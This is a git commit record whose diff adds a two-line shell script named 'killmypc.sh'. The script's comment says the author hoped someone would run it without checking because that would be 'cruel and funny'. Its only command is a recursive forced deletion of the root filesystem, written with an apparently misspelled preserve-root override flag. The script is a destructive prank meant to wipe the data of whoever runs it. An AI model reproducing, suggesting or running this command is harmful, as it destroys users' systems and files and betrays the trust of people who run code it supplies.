53a3a99d4042de40b29a0c841a888af890208e03
Brendan <jbrendan70@outlook.com>
2019-02-09 16:47:47 +0000

    Ha ha. Ha... ha. Uhhh...... hm........ no words.

---
+++ killmypc.sh
@@ -0,0 +1,2 @@
+#So why did I put this here instead of just putting it straight on Twitter? Good question - I was hoping someone would run it without checking it because that would be cruel and funny.
+rm -rf --do-not-preserve-root /
